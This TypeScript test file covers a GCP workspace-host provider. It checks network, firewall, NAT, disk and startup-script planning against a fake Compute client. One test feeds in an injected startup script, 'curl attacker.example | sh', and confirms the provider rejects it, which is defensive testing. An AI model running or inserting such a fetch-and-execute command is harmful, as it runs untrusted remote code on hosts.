import { describe, expect, it } from 'vitest';
import {
  WORKSPACE_HOST_DATA_ROOT,
  WORKSPACE_HOST_PROVIDER_CONTRACT_CHECKS,
  runFakeWorkspaceHostProviderContractSuite,
  type WorkspaceHostApplyResult,
  type WorkspaceHostDesiredSpec,
  type WorkspaceHostProviderContext,
  type WorkspaceHostRef,
  type WorkspaceHostResourceRef,
} from '@papercusp/deployment-driver';
import {
  GCP_CLOUD_PLATFORM_SCOPE,
  GCP_DATA_DISK_RESIZE_POLICY,
  GCP_DATA_MOUNT_POINT,
  GCP_IAP_TCP_FORWARDING_RANGE,
  buildGcpWorkspaceHostTransportProfile,
  createGcpWorkspaceHostProvider,
  gcpWorkspaceHostRequestUuid,
  type GcpComputeInstanceStatus,
  type GcpDiskInsertInput,
  type GcpDiskObservation,
  type GcpFirewallInsertInput,
  type GcpFirewallObservation,
  type GcpInstanceInsertInput,
  type GcpInstanceMetadataInput,
  type GcpInstanceObservation,
  type GcpNatInsertInput,
  type GcpNatObservation,
  type GcpNetworkInsertInput,
  type GcpOperationObservation,
  type GcpOperationRef,
  type GcpResourceObservation,
  type GcpRouterInsertInput,
  type GcpRouterObservation,
  type GcpSnapshotInsertInput,
  type GcpSnapshotObservation,
  type GcpSubnetworkInsertInput,
  type GcpWorkspaceHostApiClient,
  type GcpWorkspaceHostInventoryRequest,
  type GcpWorkspaceHostInventorySnapshot,
} from './gcp-provider';

const NOW = '2026-08-22T08:30:00.000Z';

describe('GCP workspace-host transport compatibility profiles', () => {
  it('declares IAP prerequisites, corporate-proxy allowlisting, audit limits, and a bulk-transfer fallback', () => {
    const profile = buildGcpWorkspaceHostTransportProfile({
      kind: 'gcp-iap-ssh',
      projectId: 'papercusp-dev-123',
      zone: 'us-central1-a',
      instanceName: 'pc-host-gcp-1-vm',
    });

    expect(profile.compatibility.requirements.map(({ id }) => id)).toEqual(
      expect.arrayContaining(['gcloud-cli', 'gcp-iap-tunnel', 'gcp-os-login', 'gcp-iap-network']),
    );
    expect(profile.compatibility.proxy).toMatchObject({
      mode: 'allowlist-required',
      requiredDomains: ['tunnel.cloudproxy.app'],
    });
    expect(profile.compatibility.traffic['bulk-transfer']).toBe('discouraged');
    expect(profile.compatibility.audit).toMatchObject({ controlPlaneEvents: true, sessionContent: false });
    expect(profile.compatibility.fallbacks).toContainEqual(
      expect.objectContaining({ feature: 'fileTransfer', strategy: 'provider-object-storage' }),
    );
  });
});

function desired(network: 'managed' | 'existing' = 'managed'): WorkspaceHostDesiredSpec {
  return {
    hostId: 'host-gcp-1',
    target: 'gcp',
    scope: { kind: 'project', id: 'papercusp-dev-123' },
    region: 'us-central1',
    zone: 'us-central1-a',
    size: 'n2-standard-2',
    image: { id: 'projects/papercusp-images/global/images/papercusp-workspace-host-2026-8-23-1' },
    data: { volumeGiB: 120, encrypted: true },
    credentials: { cloudCredentialRef: { kind: 'cloud', ref: 'adc://authorized_user' } },
    labels: { environment: 'test', owner: 'workspace-host-contract' },
    provider: {
      projectId: 'papercusp-dev-123',
      network:
        network === 'managed'
          ? {
              mode: 'managed',
              networkName: 'pc-host-gcp-1-net',
              subnetworkName: 'pc-host-gcp-1-subnet',
              firewallName: 'pc-host-gcp-1-iap',
              routerName: 'pc-host-gcp-1-router',
              natName: 'pc-host-gcp-1-nat',
              ipCidrRange: '10.132.12.0/24',
            }
          : {
              mode: 'existing',
              networkName: 'shared-vpc',
              subnetworkName: 'shared-subnet',
              firewallName: 'shared-iap-firewall',
            },
      serviceAccountEmail: 'workspace-host@papercusp-dev-123.iam.gserviceaccount.com',
      serviceAccountScopes: [GCP_CLOUD_PLATFORM_SCOPE],
      instanceName: 'pc-host-gcp-1-vm',
      dataDiskName: 'pc-host-gcp-1-data',
      dataDeviceName: 'papercusp-data',
      bootDiskGiB: 40,
      bootDiskType: 'pd-balanced',
      dataDiskType: 'pd-ssd',
      kmsKeyName: 'projects/papercusp-dev-123/locations/us-central1/keyRings/workspaces/cryptoKeys/workspace-disks',
      metadata: { 'papercusp-bootstrap-version': 'v1' },
    },
  };
}

function context(
  provider: Readonly<Record<string, unknown>> = {},
  hostBootstrapScript?: string,
): WorkspaceHostProviderContext {
  return {
    workspaceId: 'workspace-gcp-1',
    requestId: 'request-gcp-1',
    ...(hostBootstrapScript ? { hostBootstrapScript } : {}),
    connection: {
      target: 'gcp',
      cloudCredentialRef: { kind: 'cloud', ref: 'adc://authorized_user' },
      scope: { kind: 'project', id: 'papercusp-dev-123' },
      provider: { projectId: 'papercusp-dev-123', credentialSource: 'adc', ...provider },
    },
  };
}

class FakeGcpWorkspaceHostApiClient implements GcpWorkspaceHostApiClient {
  readonly insertNetworkCalls: Array<{ input: GcpNetworkInsertInput; requestId: string }> = [];
  readonly insertSubnetworkCalls: Array<{ input: GcpSubnetworkInsertInput; requestId: string }> = [];
  readonly insertFirewallCalls: Array<{ input: GcpFirewallInsertInput; requestId: string }> = [];
  readonly insertRouterCalls: Array<{ input: GcpRouterInsertInput; requestId: string }> = [];
  readonly insertNatCalls: Array<{ input: GcpNatInsertInput; requestId: string }> = [];
  readonly insertDiskCalls: Array<{ input: GcpDiskInsertInput; requestId: string }> = [];
  readonly insertInstanceCalls: Array<{ input: GcpInstanceInsertInput; requestId: string }> = [];
  readonly setInstanceMetadataCalls: Array<{ input: GcpInstanceMetadataInput; requestId: string }> = [];
  readonly snapshotCalls: Array<{ input: GcpSnapshotInsertInput; requestId: string }> = [];
  readonly waitedOperations: GcpOperationRef[] = [];
  imageDiskSizeGb = 40;
  startCalls = 0;
  stopCalls = 0;
  resetCalls = 0;
  deleteCalls = 0;

  private operationNumber = 0;
  private readonly operationsByRequestId = new Map<string, GcpOperationRef>();
  private readonly networks = new Map<string, GcpResourceObservation>();
  private readonly subnetworks = new Map<string, GcpResourceObservation>();
  private readonly firewalls = new Map<string, GcpFirewallObservation>();
  private readonly routers = new Map<string, GcpRouterObservation>();
  private readonly nats = new Map<string, GcpNatObservation>();
  private readonly disks = new Map<string, GcpDiskObservation>();
  private readonly instances = new Map<string, GcpInstanceObservation>();
  private readonly snapshots = new Map<string, GcpSnapshotObservation>();

  /**
   * WI-2143924: the real Compute client NEVER writes `agentOnline` (gcp-api-client.test.ts
   * pins its absence), so this fake deliberately does not either — a fixture that sets it
   * would validate a provider assumption against itself and hide exactly the defect that
   * shipped. A test wanting the MEASURED branches must ask for them here, explicitly.
   */
  setAgentOnline(name: string, agentOnline: boolean): void {
    const instance = this.instances.get(name);
    if (!instance) throw new Error(`fake GCP client has no instance '${name}'`);
    this.instances.set(name, { ...instance, agentOnline });
  }

  seedExistingNetwork(): void {
    this.networks.set('shared-vpc', { name: 'shared-vpc', observedAt: NOW });
    this.subnetworks.set('shared-subnet', { name: 'shared-subnet', observedAt: NOW });
    this.firewalls.set('shared-iap-firewall', {
      name: 'shared-iap-firewall',
      direction: 'INGRESS',
      sourceRanges: [GCP_IAP_TCP_FORWARDING_RANGE],
      targetTags: ['shared-hosts'],
      allowed: [{ IPProtocol: 'tcp', ports: ['22'] }],
      observedAt: NOW,
    });
  }

  seedSnapshot(name: string, hostId: string, status: GcpSnapshotObservation['status'] = 'READY'): void {
    this.snapshots.set(name, {
      name,
      status,
      labels: {
        'papercusp-host-id': hostId,
        'papercusp-managed': 'true',
        'papercusp-workspace-id': 'workspace-gcp-1',
      },
      observedAt: NOW,
    });
  }

  seedForeignNat(routerName: string, name: string): void {
    const router = this.routers.get(routerName);
    if (!router) throw new Error(`fake GCP router '${routerName}' is absent`);
    this.nats.set(`${routerName}:${name}`, {
      name,
      routerName,
      network: router.network,
      subnetwork: 'foreign-subnetwork',
      region: router.region,
      natIpAllocateOption: 'AUTO_ONLY',
      sourceSubnetworkIpRangesToNat: 'LIST_OF_SUBNETWORKS',
      observedAt: NOW,
    });
    this.routers.set(routerName, { ...router, natNames: [...router.natNames, name] });
  }

  rewriteDisk(name: string, patch: Partial<GcpDiskObservation>): void {
    const current = this.disks.get(name);
    if (!current) throw new Error(`fake GCP disk '${name}' is absent`);
    this.disks.set(name, { ...current, ...patch });
  }

  async validateConnection() {
    return {
      ok: true,
      checkedAt: NOW,
      identity: 'operator@example.com',
      warnings: [],
      errors: [],
    };
  }

  async listScopes() {
    return [{ kind: 'project', id: 'papercusp-dev-123', label: 'Papercusp development' }];
  }

  async listRegions() {
    return [{ id: 'us-central1', label: 'Iowa', available: true, zones: ['us-central1-a'] }];
  }

  async listSizes() {
    return [{ id: 'n2-standard-2', label: 'n2-standard-2', cpuCount: 2, memoryMiB: 8192, available: true }];
  }

  async listImages() {
    return [
      {
        id: 'projects/papercusp-images/global/images/papercusp-workspace-host-2026-8-23-1',
        label: 'Ubuntu 24.04 LTS',
        architecture: 'x86_64',
        signed: true,
      },
    ];
  }

  async estimatePrice() {
    return { currency: 'USD', hourlyAmount: 0.11, observedAt: NOW, confidence: 'estimated' as const };
  }

  async inventoryManagedResources(
    request: GcpWorkspaceHostInventoryRequest,
  ): Promise<GcpWorkspaceHostInventorySnapshot> {
    const observed: GcpWorkspaceHostInventorySnapshot['observed'][number][] = [];
    const add = (
      kind: string,
      name: string,
      item: GcpResourceObservation | undefined,
      location: { region?: string; zone?: string } = {},
    ) => {
      if (!item) return;
      observed.push({
        resource: {
          target: 'gcp',
          kind,
          providerId: name,
          parentProviderId: request.projectId,
          ...location,
        },
        labels: item.labels ?? {},
        observedAt: item.observedAt,
      });
    };
    for (const [name, item] of this.instances) add('vm', name, item, { zone: 'us-central1-a' });
    for (const [name, item] of this.disks) add('disk', name, item, { zone: 'us-central1-a' });
    for (const [name, item] of this.snapshots) add('snapshot', name, item);
    request.deterministicNames.networks.forEach((name) => add('network', name, this.networks.get(name)));
    request.deterministicNames.subnetworks.forEach((name) =>
      add('subnetwork', name, this.subnetworks.get(name), { region: request.region }),
    );
    request.deterministicNames.firewalls.forEach((name) => add('firewall', name, this.firewalls.get(name)));
    request.deterministicNames.routers.forEach((name) =>
      add('router', name, this.routers.get(name), { region: request.region }),
    );
    request.deterministicNames.nats.forEach(({ routerName, name }) =>
      add('nat', name, this.nats.get(`${routerName}:${name}`), { region: request.region }),
    );
    const deterministic = (
      kind: 'firewall' | 'subnetwork' | 'network' | 'router' | 'nat',
      names: readonly string[],
    ) => ({
      kind,
      strategy: 'deterministic-name' as const,
      providerEvidenceRef: `fake://inventory/${kind}`,
      deterministicNames: [...names],
    });
    return {
      complete: true,
      observed,
      inventoryEvidence: [
        { kind: 'vm', strategy: 'managed-labels', providerEvidenceRef: 'fake://inventory/vm' },
        { kind: 'disk', strategy: 'managed-labels', providerEvidenceRef: 'fake://inventory/disk' },
        deterministic('firewall', request.deterministicNames.firewalls),
        deterministic('subnetwork', request.deterministicNames.subnetworks),
        deterministic('network', request.deterministicNames.networks),
        { kind: 'snapshot', strategy: 'managed-labels', providerEvidenceRef: 'fake://inventory/snapshot' },
        deterministic('router', request.deterministicNames.routers),
        deterministic(
          'nat',
          request.deterministicNames.nats.map(({ name }) => name),
        ),
      ],
    };
  }

  async getNetwork(_projectId: string, name: string) {
    return this.networks.get(name);
  }

  async getSubnetwork(_projectId: string, _region: string, name: string) {
    return this.subnetworks.get(name);
  }

  async getFirewall(_projectId: string, name: string) {
    return this.firewalls.get(name);
  }

  async getRouter(_projectId: string, _region: string, name: string) {
    return this.routers.get(name);
  }

  async getNat(_projectId: string, _region: string, routerName: string, name: string) {
    return this.nats.get(`${routerName}:${name}`);
  }

  async getDisk(_projectId: string, _zone: string, name: string) {
    return this.disks.get(name);
  }

  async getInstance(_projectId: string, _zone: string, name: string) {
    return this.instances.get(name);
  }

  async getInstanceGuestAttributes() {
    return [];
  }

  async getSnapshot(_projectId: string, name: string) {
    return this.snapshots.get(name);
  }

  async getImageDiskSizeGb(_imageId: string) {
    return this.imageDiskSizeGb;
  }

  async insertNetwork(_projectId: string, input: GcpNetworkInsertInput, requestId: string) {
    return this.mutation(requestId, 'global', undefined, () => {
      this.insertNetworkCalls.push({ input, requestId });
      this.networks.set(input.name, { name: input.name, observedAt: NOW });
    });
  }

  async insertSubnetwork(_projectId: string, region: string, input: GcpSubnetworkInsertInput, requestId: string) {
    return this.mutation(requestId, 'region', region, () => {
      this.insertSubnetworkCalls.push({ input, requestId });
      this.subnetworks.set(input.name, { name: input.name, observedAt: NOW });
    });
  }

  async insertFirewall(_projectId: string, input: GcpFirewallInsertInput, requestId: string) {
    return this.mutation(requestId, 'global', undefined, () => {
      this.insertFirewallCalls.push({ input, requestId });
      this.firewalls.set(input.name, {
        name: input.name,
        direction: input.direction,
        sourceRanges: input.sourceRanges,
        targetTags: input.targetTags,
        allowed: input.allowed,
        observedAt: NOW,
      });
    });
  }

  async insertRouter(_projectId: string, region: string, input: GcpRouterInsertInput, requestId: string) {
    return this.mutation(requestId, 'region', region, () => {
      this.insertRouterCalls.push({ input, requestId });
      this.routers.set(input.name, {
        name: input.name,
        network: input.network,
        region,
        natNames: [],
        observedAt: NOW,
      });
    });
  }

  async insertNat(_projectId: string, region: string, input: GcpNatInsertInput, requestId: string) {
    return this.mutation(requestId, 'region', region, () => {
      const router = this.routers.get(input.routerName);
      if (!router) throw new Error('fake GCP NAT references an unknown router');
      this.insertNatCalls.push({ input, requestId });
      this.nats.set(`${input.routerName}:${input.name}`, {
        name: input.name,
        routerName: input.routerName,
        network: input.network,
        subnetwork: input.subnetwork,
        region,
        natIpAllocateOption: input.natIpAllocateOption,
        sourceSubnetworkIpRangesToNat: input.sourceSubnetworkIpRangesToNat,
        observedAt: NOW,
      });
      this.routers.set(input.routerName, { ...router, natNames: [input.name], observedAt: NOW });
    });
  }

  async insertDisk(_projectId: string, zone: string, input: GcpDiskInsertInput, requestId: string) {
    return this.mutation(requestId, 'zone', zone, () => {
      this.insertDiskCalls.push({ input, requestId });
      this.disks.set(input.name, {
        name: input.name,
        status: 'READY',
        attachedInstanceNames: [],
        sizeGb: input.sizeGb,
        labels: input.labels,
        observedAt: NOW,
      });
    });
  }

  async insertInstance(_projectId: string, zone: string, input: GcpInstanceInsertInput, requestId: string) {
    return this.mutation(requestId, 'zone', zone, () => {
      this.insertInstanceCalls.push({ input, requestId });
      const dataDiskName = input.disks[1].source.split('/').at(-1)!;
      const dataDisk = this.disks.get(dataDiskName);
      if (!dataDisk) throw new Error('fake GCP instance references an unknown data disk');
      this.disks.set(dataDiskName, {
        ...dataDisk,
        attachedInstanceNames: [input.name],
      });
      this.instances.set(input.name, {
        name: input.name,
        status: 'RUNNING',
        sourceImage: input.disks[0].initializeParams.sourceImage,
        attachedDiskNames: [dataDiskName],
        internalIp: '10.132.12.2',
        ...(input.networkInterfaces[0].accessConfigs ? { externalIp: '203.0.113.42' } : {}),
        // No `agentOnline` — see setAgentOnline() above. The real client never writes it.
        labels: input.labels,
        metadataFingerprint: 'metadata-fingerprint-1',
        recreateInput: input,
        observedAt: NOW,
      });
    });
  }

  async createSnapshot(_projectId: string, zone: string, input: GcpSnapshotInsertInput, requestId: string) {
    return this.mutation(requestId, 'zone', zone, () => {
      this.snapshotCalls.push({ input, requestId });
      this.snapshots.set(input.name, { name: input.name, status: 'READY', observedAt: NOW });
    });
  }

  async startInstance(_projectId: string, zone: string, name: string, requestId: string) {
    this.startCalls += 1;
    return this.instanceMutation(requestId, zone, name, 'RUNNING');
  }

  async stopInstance(_projectId: string, zone: string, name: string, requestId: string) {
    this.stopCalls += 1;
    return this.instanceMutation(requestId, zone, name, 'TERMINATED');
  }

  async resetInstance(_projectId: string, zone: string, name: string, requestId: string) {
    this.resetCalls += 1;
    return this.instanceMutation(requestId, zone, name, 'RUNNING');
  }

  async setInstanceMetadata(
    _projectId: string,
    zone: string,
    name: string,
    input: GcpInstanceMetadataInput,
    requestId: string,
  ) {
    return this.mutation(requestId, 'zone', zone, () => {
      const instance = this.instances.get(name);
      if (!instance?.recreateInput) throw new Error(`fake GCP client has no instance '${name}'`);
      this.setInstanceMetadataCalls.push({ input, requestId });
      this.instances.set(name, {
        ...instance,
        metadataFingerprint: `${input.fingerprint}-next`,
        recreateInput: { ...instance.recreateInput, metadata: { items: [...input.items] } },
      });
    });
  }

  async deleteInstance(_projectId: string, zone: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'zone', zone, () => {
      this.instances.delete(name);
      for (const [diskName, disk] of this.disks) {
        this.disks.set(diskName, {
          ...disk,
          attachedInstanceNames: disk.attachedInstanceNames.filter((candidate) => candidate !== name),
        });
      }
    });
  }

  async deleteDisk(_projectId: string, zone: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'zone', zone, () => this.disks.delete(name));
  }

  async deleteFirewall(_projectId: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'global', undefined, () => this.firewalls.delete(name));
  }

  async deleteNat(_projectId: string, region: string, routerName: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'region', region, () => {
      this.nats.delete(`${routerName}:${name}`);
      const router = this.routers.get(routerName);
      if (router)
        this.routers.set(routerName, { ...router, natNames: router.natNames.filter((item) => item !== name) });
    });
  }

  async deleteRouter(_projectId: string, region: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'region', region, () => this.routers.delete(name));
  }

  async deleteSubnetwork(_projectId: string, region: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'region', region, () => this.subnetworks.delete(name));
  }

  async deleteNetwork(_projectId: string, name: string, requestId: string) {
    this.deleteCalls += 1;
    return this.mutation(requestId, 'global', undefined, () => this.networks.delete(name));
  }

  async waitForOperation(operation: GcpOperationRef): Promise<GcpOperationObservation> {
    this.waitedOperations.push(operation);
    return { ...operation, status: 'DONE', observedAt: NOW };
  }

  private instanceMutation(
    requestId: string,
    zone: string,
    name: string,
    status: GcpComputeInstanceStatus,
  ): GcpOperationRef {
    return this.mutation(requestId, 'zone', zone, () => {
      const current = this.instances.get(name);
      if (!current) throw new Error(`fake GCP instance '${name}' is absent`);
      this.instances.set(name, { ...current, status, observedAt: NOW });
    });
  }

  private mutation(
    requestId: string,
    scope: GcpOperationRef['scope'],
    location: string | undefined,
    effect: () => unknown,
  ): GcpOperationRef {
    const existing = this.operationsByRequestId.get(requestId);
    if (existing) return existing;
    effect();
    const operation = {
      name: `operation-${++this.operationNumber}`,
      projectId: 'papercusp-dev-123',
      scope,
      ...(location ? { location } : {}),
      requestId,
    };
    this.operationsByRequestId.set(requestId, operation);
    return operation;
  }
}

function providerAndClient() {
  const client = new FakeGcpWorkspaceHostApiClient();
  const provider = createGcpWorkspaceHostProvider({ client, now: () => NOW });
  return { client, provider };
}

function requireAppliedResource(result: WorkspaceHostApplyResult): WorkspaceHostResourceRef {
  if (!('resource' in result) || !result.resource) {
    throw new Error(`expected an applied GCP resource, received '${result.state}'`);
  }
  return result.resource;
}

async function provision(
  client: FakeGcpWorkspaceHostApiClient,
  provider: ReturnType<typeof createGcpWorkspaceHostProvider>,
  spec = desired(),
): Promise<{ host: WorkspaceHostRef; resources: WorkspaceHostResourceRef[] }> {
  if ((spec.provider?.network as { mode?: string } | undefined)?.mode === 'existing') client.seedExistingNetwork();
  const plan = await provider.plan(
    { action: 'provision', operationId: 'provision-1', idempotencyKey: 'provision-1', desired: spec },
    context(),
  );
  const resources: WorkspaceHostResourceRef[] = [];
  for (const step of plan.steps) {
    const result = await provider.apply(
      { planId: plan.planId, operationId: plan.operationId, step, knownResources: [...resources] },
      context(),
    );
    if (
      'resource' in result &&
      result.resource &&
      !resources.some((item) => item.providerId === result.resource!.providerId)
    ) {
      resources.push(result.resource);
    }
  }
  return { host: { hostId: spec.hostId, target: 'gcp', resources }, resources };
}

describe('GCP workspace-host provider planning', () => {
  it('normalizes an undersized boot disk during planning before any provider mutation can run', async () => {
    const { client, provider } = providerAndClient();
    client.imageDiskSizeGb = 32;
    const spec = desired();
    spec.provider = { ...spec.provider, bootDiskGiB: 30 };

    const plan = await provider.plan(
      { action: 'provision', operationId: 'image-floor', idempotencyKey: 'image-floor', desired: spec },
      context(),
    );
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;

    expect(instance.disks[0].initializeParams.diskSizeGb).toBe(32);
    expect(client.insertNetworkCalls).toHaveLength(0);
    expect(client.insertDiskCalls).toHaveLength(0);
  });

  it('builds a deterministic managed resource graph with RFC-4122 request UUIDs and hardened instance inputs', async () => {
    const { provider } = providerAndClient();
    const request = {
      action: 'provision' as const,
      operationId: 'operation-1',
      idempotencyKey: 'operation-1',
      desired: desired(),
    };
    const bootstrap = '#!/usr/bin/env bash\necho papercusp-bootstrap\n';
    const [first, replay] = await Promise.all([
      provider.plan(request, context({}, bootstrap)),
      provider.plan(request, context({}, bootstrap)),
    ]);
    expect(first.steps).toEqual(replay.steps);
    expect(first.steps.map(({ id, dependsOn }) => ({ id, dependsOn }))).toEqual([
      { id: 'create-network', dependsOn: [] },
      { id: 'create-subnetwork', dependsOn: ['create-network'] },
      { id: 'create-firewall', dependsOn: ['create-network'] },
      { id: 'create-router', dependsOn: ['create-network'] },
      { id: 'create-nat', dependsOn: ['create-router', 'create-subnetwork'] },
      { id: 'create-data-disk', dependsOn: [] },
      { id: 'create-instance', dependsOn: ['create-subnetwork', 'create-firewall', 'create-nat', 'create-data-disk'] },
    ]);
    const requestIds = first.steps.map((step) => (step.input as { requestId: string }).requestId);
    expect(requestIds).toHaveLength(new Set(requestIds).size);
    requestIds.forEach((requestId) =>
      expect(requestId).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-5[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/),
    );
    expect(gcpWorkspaceHostRequestUuid('operation-1')).toBe(gcpWorkspaceHostRequestUuid('operation-1'));

    const firewall = (
      first.steps.find(({ id }) => id === 'create-firewall')!.input as unknown as { request: GcpFirewallInsertInput }
    ).request;
    expect(firewall).toMatchObject({ sourceRanges: [GCP_IAP_TCP_FORWARDING_RANGE], allowed: [{ ports: ['22'] }] });
    const nat = (first.steps.find(({ id }) => id === 'create-nat')!.input as unknown as { request: GcpNatInsertInput })
      .request;
    expect(nat).toMatchObject({
      routerName: 'pc-host-gcp-1-router',
      subnetwork: 'pc-host-gcp-1-subnet',
      natIpAllocateOption: 'AUTO_ONLY',
      sourceSubnetworkIpRangesToNat: 'LIST_OF_SUBNETWORKS',
      minPortsPerVm: 64,
      enableEndpointIndependentMapping: false,
    });
    const disk = (
      first.steps.find(({ id }) => id === 'create-data-disk')!.input as unknown as { request: GcpDiskInsertInput }
    ).request;
    expect(disk).toMatchObject({ sizeGb: 120, type: 'pd-ssd', diskEncryptionKey: { kmsKeyName: expect.any(String) } });
    const instance = (
      first.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    expect(instance.networkInterfaces[0]).not.toHaveProperty('accessConfigs');
    expect(instance.serviceAccounts).toEqual([
      {
        email: 'workspace-host@papercusp-dev-123.iam.gserviceaccount.com',
        scopes: [GCP_CLOUD_PLATFORM_SCOPE],
      },
    ]);
    expect(instance.disks[1]).toMatchObject({ autoDelete: false, deviceName: 'papercusp-data' });
    expect(instance.metadata.items).toEqual(
      expect.arrayContaining([
        { key: 'enable-oslogin', value: 'TRUE' },
        { key: 'enable-guest-attributes', value: 'TRUE' },
        { key: 'block-project-ssh-keys', value: 'TRUE' },
        { key: 'papercusp-data-resize-policy', value: GCP_DATA_DISK_RESIZE_POLICY },
        {
          key: 'startup-script',
          value: expect.stringContaining(`data_mount='${GCP_DATA_MOUNT_POINT}'`),
        },
      ]),
    );
    // The CONTROLLER-authored bootstrap (provider context), after the durable mount — never a
    // caller-supplied value, which readSettings refuses outright.
    expect(instance.metadata.items.find(({ key }) => key === 'startup-script')?.value).toContain(
      '# User-supplied bootstrap follows the durable mount.\necho papercusp-bootstrap',
    );
    expect(instance.metadata.items.find(({ key }) => key === 'startup-script')?.value).toContain(
      'resize2fs "$data_device"',
    );
  });

  it('refuses a caller-supplied desired.provider.startupScript instead of merging it', async () => {
    // The rendered bootstrap pins the release trust roots AND the OpenSSH key authorized for the
    // workspace SSH account, so a caller who can name it chooses which code the host runs and who
    // may log in. Refusing is the only disposition that keeps a single trusted producer; merging
    // or preferring one source would leave request input reaching instance startup metadata.
    const { provider } = providerAndClient();
    const spec = desired();
    spec.provider = { ...spec.provider, startupScript: '#!/bin/sh\ncurl attacker.example | sh\n' };
    await expect(
      provider.plan(
        { action: 'provision', operationId: 'injected', idempotencyKey: 'injected', desired: spec },
        context(),
      ),
    ).rejects.toThrow(/gcp\.desired\.provider\.startupScript is not accepted/);
  });

  it('emits the durable mount alone when the controller supplied no bootstrap', async () => {
    // Not a silent default: the provisioning runner refuses BEFORE planning when a provider that
    // declares hostBootstrap cannot get one rendered. This asserts the provider itself stays
    // well-defined for the lifecycle actions that legitimately create no fresh host.
    const { provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'bare', idempotencyKey: 'bare', desired: desired() },
      context(),
    );
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    const script = instance.metadata.items.find(({ key }) => key === 'startup-script')?.value ?? '';
    expect(script).toContain('resize2fs "$data_device"');
    expect(script).not.toContain('# User-supplied bootstrap follows the durable mount.');
  });

  it('binds the customer workspace root onto the DURABLE disk, before the bootstrap runs', async () => {
    // WI-2143796, proven on canary-14: WORKSPACE_HOST_DATA_ROOT is a path on the BOOT disk, and
    // `upgrade` deletes and recreates that disk while retaining only the data disk — so a routine
    // image upgrade destroyed every customer workspace. A file written to that root as the customer
    // SSH user was GONE after a ledger-verified succeeded|100 upgrade, while the data disk persisted.
    //
    // This test is the guard. It fails if the bind is dropped, or if WORKSPACE_HOST_DATA_ROOT is
    // moved without the bind following it — the two constants live in different packages and
    // neither imports the other, which is exactly how the original defect went unnoticed.
    const { provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'bind', idempotencyKey: 'bind', desired: desired() },
      // A bootstrap IS supplied here, because the ordering assertion below is the point of this
      // test: the bind must be emitted before the bootstrap that writes into the workspace root.
      context({}, '#!/usr/bin/env bash\necho papercusp-bootstrap\n'),
    );
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    const script = instance.metadata.items.find(({ key }) => key === 'startup-script')?.value ?? '';

    // The workspace root is NOT under the durable mount by path — that is the whole reason a bind
    // is required rather than a plain mkdir, so assert the premise the fix rests on.
    expect(WORKSPACE_HOST_DATA_ROOT.startsWith(`${GCP_DATA_MOUNT_POINT}/`)).toBe(false);

    expect(script).toContain(
      `mountpoint -q '${WORKSPACE_HOST_DATA_ROOT}' || mount --bind "$data_mount/workspaces" '${WORKSPACE_HOST_DATA_ROOT}'`,
    );
    // Survives reboot as well as instance recreation.
    expect(script).toContain(`grep -q " ${WORKSPACE_HOST_DATA_ROOT} none bind" /etc/fstab`);
    // The bind SOURCE must be the directory this script creates on the durable mount.
    expect(script).toContain('install -d -m 0750 "$data_mount"/{postgres,repositories,transcripts,workspaces}');

    // ORDERING IS LOAD-BEARING: the bind must precede the user bootstrap, so the bootstrap's own
    // `install -d`/`setfacl` on the workspace root write through to the durable disk instead of
    // being hidden by a mount that lands on top of them afterwards.
    const bindAt = script.indexOf(`mount --bind "$data_mount/workspaces"`);
    const bootstrapAt = script.indexOf('# User-supplied bootstrap follows the durable mount.');
    expect(bindAt).toBeGreaterThan(-1);
    expect(bootstrapAt).toBeGreaterThan(-1);
    expect(bindAt).toBeLessThan(bootstrapAt);
  });

  it('provisions restricted direct SSH with only tcp/22 and returns a complete machine profile', async () => {
    const { client, provider } = providerAndClient();
    const spec = desired();
    spec.transportPreference = 'gcp-direct-ssh';
    spec.provider = { ...spec.provider, directSshSourceRanges: ['203.0.113.8/32'] };
    const plan = await provider.plan(
      { action: 'provision', operationId: 'direct', idempotencyKey: 'direct', desired: spec },
      context(),
    );
    const firewall = (
      plan.steps.find(({ id }) => id === 'create-firewall')!.input as unknown as { request: GcpFirewallInsertInput }
    ).request;
    expect(firewall.sourceRanges).toEqual(['203.0.113.8/32']);
    expect(firewall.allowed).toEqual([{ IPProtocol: 'tcp', ports: ['22'] }]);
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    expect(instance.networkInterfaces[0].accessConfigs).toEqual([
      { name: 'External NAT', type: 'ONE_TO_ONE_NAT', networkTier: 'PREMIUM' },
    ]);

    const { host } = await provision(client, provider, spec);
    const profile = await provider.getTransportProfile(host, context({ transportPreference: 'gcp-direct-ssh' }));
    expect(profile).toMatchObject({
      kind: 'gcp-direct-ssh',
      audited: false,
      features: { command: true, pty: true, tcpForward: true, fileTransfer: true },
    });
    expect(profile.endpoint).toContain('ssh://203.0.113.42:22?');
    expect(profile.endpoint).toContain('project=papercusp-dev-123');
  });

  it('provisions Defguard without a public IP or inbound GCP firewall and emits an overlay profile', async () => {
    const { client, provider } = providerAndClient();
    const spec = desired();
    spec.transportPreference = 'defguard-ssh';
    const plan = await provider.plan(
      { action: 'provision', operationId: 'defguard', idempotencyKey: 'defguard', desired: spec },
      context(),
    );
    expect(plan.steps.map(({ id }) => id)).toEqual([
      'create-network',
      'create-subnetwork',
      'create-router',
      'create-nat',
      'create-data-disk',
      'create-instance',
    ]);
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    expect(instance.networkInterfaces[0]).not.toHaveProperty('accessConfigs');

